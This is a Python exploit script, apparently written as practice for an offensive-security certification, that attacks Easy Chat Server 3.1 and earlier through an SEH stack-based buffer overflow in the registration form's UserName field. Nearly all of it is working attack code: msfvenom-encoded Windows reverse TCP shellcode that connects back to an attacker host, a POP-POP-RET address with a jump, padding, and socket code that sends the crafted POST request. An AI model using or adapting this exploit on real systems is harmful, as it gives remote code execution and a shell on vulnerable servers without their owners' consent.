#!/usr/bin/env python

# TYLER BOYKIN ( @CaptBoykin )
#   Took around 8-10h.  Need to build my momentum.
# Practice of CTP / OSCE

# Easy Chat Server Exploit (<=3.1) - SEH Stack Based Overflow
# https://www.doyler.net/wp-content/uploads/easyChatServer/ecssetup.zip

from struct import pack
import socket

def p(x):
    return pack('<I',x)

OFFSET=210
SEH='1234'
NSEH='5678'
CABOOSE=3682
RHOST='192.168.1.66'
RPORT=80

url = "POST /registresult.htm HTTP/1.1\r\n"
header_1 = "Host: %s\r\n" % (RHOST)
header_2 = "Content-Type: application/x-www-form-urlencoded\r\n"
header_3 = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\r\n\r\n"

# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.65 LPORT=123 -e x86/alpha_mixed --smallest -f python

buf =  ""
buf += "\x89\xe0\xdb\xcc\xd9\x70\xf4\x59\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x59\x78\x6b\x32"
buf += "\x45\x50\x57\x70\x37\x70\x61\x70\x4d\x59\x79\x75\x76"
buf += "\x51\x69\x50\x70\x64\x6e\x6b\x62\x70\x66\x50\x4c\x4b"
buf += "\x72\x72\x46\x6c\x6e\x6b\x46\x32\x66\x74\x4e\x6b\x30"
buf += "\x72\x54\x68\x74\x4f\x38\x37\x30\x4a\x56\x46\x70\x31"
buf += "\x4b\x4f\x6c\x6c\x45\x6c\x50\x61\x73\x4c\x55\x52\x46"
buf += "\x4c\x65\x70\x4f\x31\x6a\x6f\x56\x6d\x43\x31\x79\x57"
buf += "\x68\x62\x4a\x52\x53\x62\x30\x57\x4e\x6b\x61\x42\x74"
buf += "\x50\x6e\x6b\x63\x7a\x65\x6c\x6c\x4b\x62\x6c\x64\x51"
buf += "\x72\x58\x58\x63\x61\x58\x63\x31\x78\x51\x66\x31\x4c"
buf += "\x4b\x36\x39\x65\x70\x37\x71\x38\x53\x6e\x6b\x32\x69"
buf += "\x75\x48\x4b\x53\x64\x7a\x31\x59\x4c\x4b\x77\x44\x6e"
buf += "\x6b\x67\x71\x78\x56\x64\x71\x69\x6f\x6c\x6c\x6a\x61"
buf += "\x78\x4f\x56\x6d\x56\x61\x5a\x67\x54\x78\x4b\x50\x70"
buf += "\x75\x78\x76\x37\x73\x33\x4d\x69\x68\x37\x4b\x71\x6d"
buf += "\x54\x64\x44\x35\x7a\x44\x66\x38\x6e\x6b\x52\x78\x55"
buf += "\x74\x46\x61\x49\x43\x53\x56\x6c\x4b\x34\x4c\x52\x6b"
buf += "\x6e\x6b\x42\x78\x57\x6c\x63\x31\x49\x43\x4c\x4b\x75"
buf += "\x54\x4c\x4b\x36\x61\x4e\x30\x4e\x69\x37\x34\x66\x44"
buf += "\x66\x44\x63\x6b\x43\x6b\x51\x71\x76\x39\x51\x4a\x56"
buf += "\x31\x49\x6f\x39\x70\x51\x4f\x53\x6f\x61\x4a\x4c\x4b"
buf += "\x65\x42\x48\x6b\x4e\x6d\x31\x4d\x62\x48\x56\x53\x64"
buf += "\x72\x77\x70\x73\x30\x32\x48\x64\x37\x51\x63\x65\x62"
buf += "\x73\x6f\x46\x34\x32\x48\x72\x6c\x72\x57\x65\x76\x45"
buf += "\x57\x4d\x59\x48\x68\x59\x6f\x5a\x70\x4c\x78\x5a\x30"
buf += "\x76\x61\x33\x30\x33\x30\x71\x39\x78\x44\x73\x64\x52"
buf += "\x70\x33\x58\x64\x69\x4f\x70\x42\x4b\x57\x70\x59\x6f"
buf += "\x5a\x75\x62\x4a\x44\x4a\x45\x38\x79\x50\x39\x38\x36"
buf += "\x61\x32\x61\x65\x38\x65\x52\x35\x50\x55\x50\x43\x4b"
buf += "\x6d\x59\x6a\x46\x50\x50\x62\x70\x56\x30\x70\x50\x37"
buf += "\x30\x46\x30\x73\x70\x52\x70\x32\x48\x48\x6a\x56\x6f"
buf += "\x4b\x6f\x39\x70\x6b\x4f\x58\x55\x4c\x57\x62\x4a\x74"
buf += "\x50\x31\x46\x61\x47\x35\x38\x5a\x39\x79\x35\x64\x34"
buf += "\x33\x51\x49\x6f\x6e\x35\x4f\x75\x49\x50\x74\x34\x46"
buf += "\x6c\x59\x6f\x72\x6e\x64\x48\x32\x55\x58\x6c\x53\x58"
buf += "\x38\x70\x48\x35\x4c\x62\x61\x46\x69\x6f\x6e\x35\x53"
buf += "\x5a\x35\x50\x70\x6a\x43\x34\x63\x66\x51\x47\x35\x38"
buf += "\x43\x32\x6b\x69\x48\x48\x63\x6f\x4b\x4f\x38\x55\x6c"
buf += "\x4b\x77\x46\x62\x4a\x57\x30\x65\x38\x55\x50\x56\x70"
buf += "\x77\x70\x43\x30\x42\x76\x32\x4a\x47\x70\x51\x78\x70"
buf += "\x58\x79\x34\x42\x73\x6a\x45\x59\x6f\x58\x55\x4d\x43"
buf += "\x51\x43\x32\x4a\x77\x70\x31\x46\x63\x63\x50\x57\x61"
buf += "\x78\x55\x52\x5a\x79\x48\x48\x51\x4f\x59\x6f\x69\x45"
buf += "\x35\x51\x69\x53\x64\x69\x4a\x66\x72\x55\x78\x6e\x4a"
buf += "\x63\x41\x41"

pop_pop_ret = p(0x1001580D)

payload = ""
payload += 'A' * (OFFSET)
payload += '\xEB\x16\xCC\xCC' # A hop ahead, instead of backwards
payload += pop_pop_ret
payload += 'B' * 12
payload += 'CCCC'
payload += '\x90\x90\x90\x90'
payload += buf
payload += 'Z' * (702 - len(buf) - 4)

data="UserName=%s&" % (payload)
data+="Password=a&"
data+="Password1=&"
data+="Sex=2&Email=%40&Icon=0.gif&Resume=&cw=1&RoomID=%3c%21--%24RoomID--%3e&RepUserName=%3c%21--%24UserName--%3e&submit1=Register"

exploit = ""
exploit += url
exploit += header_1
exploit += header_2
exploit += header_3
exploit += data

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
s.send(exploit)
